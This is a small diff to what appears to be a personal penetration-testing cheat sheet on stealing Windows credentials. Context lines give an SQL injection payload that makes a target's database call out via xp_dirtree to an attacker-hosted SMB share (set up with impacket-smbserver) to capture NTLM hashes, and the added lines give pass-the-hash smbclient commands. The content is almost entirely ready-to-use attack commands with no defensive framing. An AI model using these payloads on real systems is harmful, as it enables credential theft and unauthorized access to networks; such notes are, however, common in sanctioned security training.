@@ -72,3 +72,9 @@ Using Responder to Steal Creds
 Useing impacket to steal NTML hashes - similar to sql injection look for =# at the end of the url.
 # impacket-smbserver hack $(pwd)
 http://<IP ADDRESS>/page.aspx?somethingid=15; use master; exec xp_dirtree '\\<LHOST>\<SHARE>';--
+
+
+--------------- Pass the Hash ---------------
+smbclient –L \\\\<IP ADDRESS>\\ -U username%<hash> --pw-nt-hash
+smbclient \\\\<IP ADDRESS>\\<SHARE> -U username%<hash> --pw-nt-hash
+
